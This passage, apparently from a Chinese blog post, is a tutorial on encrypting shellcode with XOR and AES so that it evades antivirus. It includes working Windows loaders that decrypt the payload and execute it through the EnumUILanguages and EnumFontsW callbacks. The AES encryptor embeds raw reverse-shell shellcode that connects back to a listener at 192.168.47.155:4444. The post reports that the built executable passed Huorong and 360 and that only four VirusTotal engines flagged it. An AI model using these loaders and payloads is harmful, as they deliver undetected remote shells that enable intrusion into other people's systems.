class="comment">#通过bin文件获取shellcode</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        buf = file.read()</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义密钥</span></span><br><span class="line">    key = <span class="built_in">bytearray</span>(<span class="string">b&#x27;12henry1222345??6aa+-==@asd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用xor_encrypt函数加密shellcode</span></span><br><span class="line">    encrypted_shellcode = xor_encrypt(shellcode, key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出加密后的shellcode</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted shellcode:&quot;</span>)</span><br><span class="line">    encrypted_shellcode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_shellcode:</span><br><span class="line">        encrypted_shellcode_string += (<span class="string">&quot;\\x%02x&quot;</span>%byte)</span><br><span class="line">    <span class="built_in">print</span>(encrypted_shellcode_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>使用<code>xor加密.cpp</code>解密加密后的shellcode，随后将其加载进内存</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 存放xor加密后的shellcode</span></span><br><span class="line">    <span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;...&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义解密所用的密钥</span></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;12henry1222345??6aa+-==@asd&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个与加密shellcode大小相同的数组用于存储解密后的shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取密钥的长度</span></span><br><span class="line">    <span class="type">int</span> keylength = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历加密的shellcode，并使用异或操作进行解密，将结果存储在shellcode数组中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">        shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%x&quot;</span>, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取解密后的shellcode的地址</span></span><br><span class="line">    <span class="type">char</span>* addrShellcode = (<span class="type">char</span>*)shellcode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个DWORD变量用于存储旧的内存保护属性</span></span><br><span class="line">    DWORD dwOldPro = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更改解密后的shellcode所在内存区域的保护属性，允许执行、读、写</span></span><br><span class="line">    BOOL ifExec = <span class="built_in">VirtualProtect</span>(addrShellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;dwOldPro);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用EnumUILanguages函数执行解密后的shellcode</span></span><br><span class="line">    <span class="built_in">EnumUILanguages</span>((UILANGUAGE_ENUMPROC)addrShellcode, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>若要加密stageless的shellcode, 有两种方法, 首先第一种是通过010editor打开bin文件获取python形式的buf, 随后粘贴到<code>Shellcode_XorEncoder.py</code></p>
<img src="shellcode加密/image-20230704205027631.png" alt="image-20230704205027631" style="zoom:67%;" />	



<p>还有一种是直接打开bin文件获取shellcode, 我更加推荐使用这种</p>
<img src="shellcode加密/image-20230704205212610.png" alt="image-20230704205212610" style="zoom:67%;" />	



<p>运行<code>Shellcode_XorEncoder.py</code>后将控制台输出的加密后的shellcode复制到<code>xor加密.cpp</code></p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230704205433520.png" alt="image-20230704205433520"></p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230704205613170.png" alt="image-20230704205613170"></p>
<p>​		</p>
<h1 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h1><h2 id="什么是aes加密"><a href="#什么是aes加密" class="headerlink" title="什么是aes加密"></a>什么是aes加密</h2><p>AES加密，即高级加密标准（Advanced Encryption Standard）加密，是一种对称密钥加密算法，广泛应用于现代密码学中</p>
<p>AES加密的特点如下：</p>
<ul>
<li>对称密钥：加密和解密过程使用相同的密钥。因此，密钥的安全性至关重要。</li>
<li>密钥长度：AES支持128位、192位和256位三种密钥长度，安全性随密钥长度的增加而增加。</li>
<li>分组长度：AES加密算法对数据进行分组，每个分组固定为128位（16字节）。</li>
<li>加密过程：包括多轮（轮数与密钥长度有关，如AES-128需要10轮，AES-192需要12轮，AES-256需要14轮）的加密操作。每轮操作包括四个步骤：SubBytes（字节替换）、ShiftRows（行移位）、MixColumns（列混淆，最后一轮除外）和AddRoundKey（轮密钥加）</li>
</ul>
<h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><p>这里直接使用乌鸦师傅的aes加密代码：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1939317%EF%BC%8C%E6%88%91%E5%B0%86aes%E5%8A%A0%E5%AF%86%E7%9A%84%E5%87%BD%E6%95%B0%E5%B0%81%E8%A3%85%E5%9C%A8%E4%B8%80%E4%B8%AA%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E9%A1%B9%E7%9B%AE%E9%87%8C%EF%BC%8C%E5%86%8D%E6%B7%BB%E5%8A%A0%E4%BA%86%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%92%8Cshellcode%E6%95%B0%E7%BB%84%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%80%E5%85%B1%E6%9C%89%E5%9B%9B%E4%B8%AA%E5%87%BD%E6%95%B0">https://cloud.tencent.com/developer/article/1939317，我将aes加密的函数封装在一个静态链接库项目里，再添加了密钥生成函数和shellcode数组转字符串函数，一共有四个函数</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AES加密</span></span><br><span class="line"><span class="function">string <span class="title">EncryptionAES</span><span class="params">(<span class="type">const</span> string&amp; strSrc, <span class="type">const</span> <span class="type">char</span>* g_key, <span class="type">const</span> <span class="type">char</span>* g_iv)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AES解密</span></span><br><span class="line"><span class="function">string <span class="title">DecryptionAES</span><span class="params">(<span class="type">const</span> string&amp; strSrc, <span class="type">const</span> <span class="type">char</span>* g_key, <span class="type">const</span> <span class="type">char</span>* g_iv)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成随机密钥</span></span><br><span class="line"><span class="function">string <span class="title">random_string</span><span class="params">(<span class="type">size_t</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将char类型的shellcode转换成string类型的</span></span><br><span class="line"><span class="function">string <span class="title">toHexString</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure>



<p><code>Shellcode_AesEncrypt.cpp</code>对shellcode进行Aes加密</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Shellcode加密库.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//填写msf或cs生成的shellcode</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line">	<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line">	<span class="string">&quot;\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x51&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x8b\x52\x20\x56\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span></span><br><span class="line">	<span class="string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0&quot;</span></span><br><span class="line">	<span class="string">&quot;\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1&quot;</span></span><br><span class="line">	<span class="string">&quot;\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line">	<span class="string">&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83&quot;</span></span><br><span class="line">	<span class="string">&quot;\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\x89\xe5\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x2f\x9b\x41\x54&quot;</span></span><br><span class="line">	<span class="string">&quot;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00&quot;</span></span><br><span class="line">	<span class="string">&quot;\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68&quot;</span></span><br><span class="line">	<span class="string">&quot;\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2&quot;</span></span><br><span class="line">	<span class="string">&quot;\xf0\xb5\xa2\x56\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//生成随机16位的key值和iv值</span></span><br><span class="line">	<span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>)); <span class="comment">// initialize random seed</span></span><br><span class="line">	string g_key = <span class="built_in">random_string</span>(<span class="number">16</span>);</span><br><span class="line">	string g_iv = <span class="built_in">random_string</span>(<span class="number">16</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;key值: &quot;</span> &lt;&lt; g_key &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;iv值: &quot;</span> &lt;&lt; g_iv &lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将shellcode字节数组转换成十六进制字符串</span></span><br><span class="line">	<span class="type">size_t</span> bufLen = <span class="built_in">sizeof</span>(buf) / <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>) - <span class="number">1</span>;</span><br><span class="line">	string OriginalShellcode = <span class="built_in">toHexString</span>(buf, bufLen);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;未加密的shellcode: &quot;</span> &lt;&lt; OriginalShellcode &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//对shellcode字符串进行加密</span></span><br><span class="line">	string EncryptShellcode = <span class="built_in">EncryptionAES</span>(OriginalShellcode,g_key.<span class="built_in">c_str</span>(),g_iv.<span class="built_in">c_str</span>());</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;加密后的shellcode: &quot;</span> &lt;&lt; EncryptShellcode &lt;&lt; endl;</span><br><span class="line">	<span class="comment">//对加密后的shellcode字符串进行解密</span></span><br><span class="line">	string DecryptShellcode = <span class="built_in">DecryptionAES</span>(EncryptShellcode, g_key.<span class="built_in">c_str</span>(), g_iv.<span class="built_in">c_str</span>());</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;解密后的shellcode: &quot;</span> &lt;&lt; DecryptShellcode &lt;&lt; endl;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><code>Shellcode_AesDecrypt.cpp</code>用来解密shellcode并加载，此处还调用了lazy_importer库的函数:<a target="_blank" rel="noopener" href="https://github.com/JustasMasiulis/lazy_importer%EF%BC%8C%E6%AD%A4%E5%BA%93%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E7%B3%BB%E7%BB%9Fapi%E5%87%BD%E6%95%B0">https://github.com/JustasMasiulis/lazy_importer，此库实现动态调用系统api函数</a>, 只需在函数前面添加(<code>LI_FN</code>), 若此函数的某个参数需填<code>NULL</code>, 那么需要改成<code>nullptr</code></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lazy_importer.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Shellcode加密库.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> g_key[<span class="number">17</span>] = <span class="string">&quot;M7N@ExCVB@dFd]3W&quot;</span>;   <span class="comment">//填写key密钥</span></span><br><span class="line"><span class="type">char</span> g_iv[<span class="number">17</span>] = <span class="string">&quot;&#125;%?#U)6;9#uOg6gL&quot;</span>;  <span class="comment">//定义iv向量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 加密后的shellcode</span></span><br><span class="line">	string buf = <span class="string">&quot;Zq3ejgFVl/qtP/dqcQidBN6BKWTiL/KZZpfW+Iy8ZMnaA4Au2oEHMltr8TihG9yvvQ1MDt0PFqboWsF5ka9y72L9xJ5a4HRBFspK3vMwvtKMH8Xtko6ErmfUUB8pv4n4DybjQseeuYtPqEDGvX8zlwONk9nyu5r8aozfNCxLvnbFyzX5OLInbra87Az3FGhilZnCwMufIPZLgolhRkgyhnS96CsMst/pNz4AqcCNmfe7Gw1rcuVgHqETNxwIsNzWDmUguUJ173NHAZJpKmF1k39IYnF4JMvVk3QH81jzX68ClhGvADXnPlmz20PHzzjKOzkovpW4cPT3Q/1B2HOwWwhKPZdLKakJeuSa1YLwv6Nu3UdP8II6dGDVsgb4y/U7O1aiHbJFXSM5XXx7eKqTe8MV8gLfwNNR6M4qaWEm7XmdsE0WryhL5F1SFe/6uxPrcIFnGE3I0jVntLjYfVWotkkrEgL7M6rXlOgKHF3Pd6AIIPm23zULA9NyJsHuKmqOUgyzf7LiPxPcIqhNo5DA1opqCqBS3XTeusUjr6x3AyBT9MquUeJKuB7BBtWJWyuQzTzzSXaDRmErc6lSTM+DKTo101TZYKz4Jl2I8xDMey7IJT+Z1iYt/thgi1FeRLnrGAFKhNn3xAqjYORcKXLPGkSWq1MoZZxOJi6QF1uqMlB3tDBD6w/pAhuqHR+ZxnaHjfbqybG8rNLXc6hshmazoiFakC9QwHM9RgyVde9GGpkNr+wzjp1Tc1SbXSHtFHXumU1IP6NvLqU0/tWrTui9t8nrsqNFgGlQUXyAzmnk04vXJeD7kxGbSFSXwffPGUlOtDS1q/+P+fwj+ZvjpmiPLzoo+hgZ0UOtyO1ThltWr4rWitqMPneleC11qlVcyOp0odOTxuZiUeJyTOY9wHWwXg3snVWat23VSE7eQ4QWcF/GtfRVBsiGGENo1hH1nuxNTlEx/2os30f3IOj/yUfIXpuwHaWsNwlyw6119Z3PgCOdR+1qDCvJenZEsCkyjUJ830xC1V5VxCw1m0btTP+LaefsNEocc5V7fyNyaw0o72yl/g+bacycAbG/hIJlWbaXneDFysBLPtLFJjXm0gAsE3iyffdB9l6c8ffohInaNlWC8x7IDb4X6vrFC8cncDFb3NKIInVFR6bmqXfxXAamxzKXdpVjngPZg6YCWpTUtobZhThnhpO1KZxvHoFCcidxLq+mifWHpcldcS/ez2vWGdriSbd6i9FGGaxQQvHze1HmaLP/sj34JDMfIVfOI2/4sejnjluKfhcu5I0P76idHJKMDHr+rJBtpSxX3jc+UNlfeFmhjuN2Yy/TO1kLRfUdfAeZP2Vz4WhITdRf8bvqJA==&quot;</span>;</span><br><span class="line">	<span class="comment">// 解密shellcode</span></span><br><span class="line">	string strbuf = <span class="built_in">DecryptionAES</span>(buf, g_key, (<span class="type">char</span>*)g_iv);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将解密的shellcode放到shellcode数组中</span></span><br><span class="line">	<span class="type">char</span>* p = (<span class="type">char</span>*)strbuf.<span class="built_in">c_str</span>();</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>* shellcode = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">calloc</span>(strbuf.<span class="built_in">length</span>() / <span class="number">2</span>, <span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; strbuf.<span class="built_in">length</span>() / <span class="number">2</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">sscanf</span>(p, <span class="string">&quot;%02x&quot;</span>, &amp;shellcode[i]);</span><br><span class="line">		p += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//输出shellcode数组里的内容</span></span><br><span class="line">	<span class="type">int</span> ShellcodeSize = strbuf.<span class="built_in">length</span>() / <span class="number">2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Decrypted buffer:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ShellcodeSize; i++) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, shellcode[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//加载shellcode</span></span><br><span class="line">	<span class="type">char</span>* orig_buffer;</span><br><span class="line">	orig_buffer = (<span class="type">char</span>*)<span class="built_in">LI_FN</span>(VirtualAlloc)(<span class="literal">nullptr</span>, ShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">RtlMoveMemory</span>(orig_buffer, shellcode, ShellcodeSize);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//使用EnumUILanguages函数执行解密后的shellcode</span></span><br><span class="line">	<span class="comment">//EnumUILanguages((UILANGUAGE_ENUMPROC)orig_buffer, 0, 0);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//LI_FN(EnumUILanguages)((UILANGUAGE_ENUMPROC)orig_buffer, 0, 0);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用EnumFontsW回调函数加载shellcode</span></span><br><span class="line">	<span class="built_in">EnumFontsW</span>(<span class="built_in">GetDC</span>(<span class="literal">NULL</span>), <span class="literal">NULL</span>, (FONTENUMPROCW)orig_buffer, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><p>给aes加密项目添加引用，选择Shellcode加密库</p>
<img src="shellcode加密/image-20230516154853419.png" alt="image-20230516154853419" style="zoom:67%;" />	



<p>修改项目属性，在附加包含目录处添加上Shellcode加密库项目的路径</p>
<img src="shellcode加密/image-20230516155107883.png" alt="image-20230516155107883" style="zoom:67%;" />	



<p>使用<code>Shellcode_AesEncryption.cpp</code>进行加密, 随后控制台输出key值、iv值、以及加密后的shellcode</p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230515195113865.png" alt="image-20230515195113865"></p>
<p>打开<code>Shellcode_AesDecrypt.cpp</code>,填写上述生成的值, 随后生成可执行文件</p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230515195404012.png" alt="image-20230515195404012"></p>
<p>将生成的可执行文件放到火绒和360里测试,没有发现报毒</p>
<img src="shellcode加密/image-20230515201325408.png" alt="image-20230515201325408" style="zoom:67%;" />	

<img src="shellcode加密/image-20230515201541815.png" alt="image-20230515201541815" style="zoom:67%;" />	



<p>上传至VirusTotal检查，只有四个报毒，免杀效果还是可以的</p>
<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230516154122994.png" alt="image-20230516154122994">	</p>
<h1 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h1><h1 id="Git项目地址"><a href="#Git项目地址" class="headerlink" title="Git项目地址"></a>Git项目地址</h1><p><a target="_blank" rel="noopener" href="https://github.com/xf555er/ShellcodeEncryption">https://github.com/xf555er/ShellcodeEncryption</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/shellcode%E5%88%86%E7%A6%BB%E5%8A%A0%E8%BD%BD/">

